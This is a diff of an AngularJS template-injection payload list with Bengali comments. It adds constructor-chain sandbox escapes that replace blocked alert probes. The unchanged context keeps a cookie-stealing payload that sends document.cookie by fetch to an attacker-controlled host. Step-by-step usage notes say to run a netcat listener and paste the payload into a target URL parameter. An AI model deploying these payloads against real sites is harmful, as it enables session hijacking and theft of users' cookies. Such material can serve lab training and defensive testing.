@@ -2,9 +2,10 @@
 
 // 1. বেসিক ডিটেকশন
 {{5+5}}
-{{alert(1)}}
-{{console.log(1)}}
-{{confirm(1)}}
+{{constructor.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}     // lab-reliable sandbox escape (Chrome-safe)
+// {{alert(1)}} ব্লক হয়েছে আধুনিক Chrome-এ - উপরের constructor চেইন ব্যবহার করুন
 
 // 2. স্যান্ডবক্স এসকেপ
 {{constructor.constructor('alert(1)')()}}
@@ -71,7 +72,7 @@
 {{constructor.constructor('fetch("http://YOUR-IP:4444?c="+document.cookie)')()}}
 
 // ============= ব্যবহার করার নিয়ম =============
-// 1. YOUR-IP এর জায়গায় আপনার IP দিন: 172.22.33.47
+// 1. YOUR-IP এর জায়গায় আপনার IP দিন: ATTACKER-IP (e.g. 10.0.0.1)
 // 2. লিসেনার চালান: nc -lvp 4444
 // 3. URL এ পেস্ট করুন:
 //    http://target.com/angular?name=PAYLOAD_HERE
